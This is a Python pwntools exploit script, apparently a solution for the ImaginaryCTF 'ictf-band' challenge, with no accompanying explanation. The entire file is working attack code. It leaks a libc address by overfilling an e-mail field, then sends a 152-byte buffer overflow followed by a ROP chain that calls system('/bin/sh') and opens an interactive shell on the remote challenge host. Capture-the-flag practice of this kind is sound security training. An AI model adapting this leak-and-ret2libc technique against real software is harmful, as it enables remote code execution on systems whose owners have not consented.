#!/usr/bin/env python3

from pwn import *

exe = ELF("./ictf-band_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("ictf-band.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot", b"0")
    io.sendlineafter(b"Album Count", b"0")
    io.sendlineafter(b"y/n", b"y")
    io.sendlineafter(b"soon:", b"16")
    io.sendlineafter(b"e-mail:", b"@" * 15)
    io.recvuntil(b"@@@@")
    io.recvline()
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    info(f"leak: {hex(leak)}")
    libc.address = leak - 2209664
    io.sendlineafter(b"y/n", b"y")

    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b"Slot", b"0")
    io.sendlineafter(b"Album Count", b"0")
    io.sendlineafter(b"y/n", b"y")
    payload = cyclic(152)

    rop = ROP(libc)
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.system(next(libc.search(b"/bin/sh")))
    print(rop.dump())
    
    payload += bytes(rop)
    
    io.sendlineafter(b"soon:", f"{len(payload)+1}".encode())

    
        
    io.sendlineafter(b"e-mail:", payload)
    io.sendlineafter(b"y/n", b"y")


    
    io.interactive()


if __name__ == "__main__":
    main()
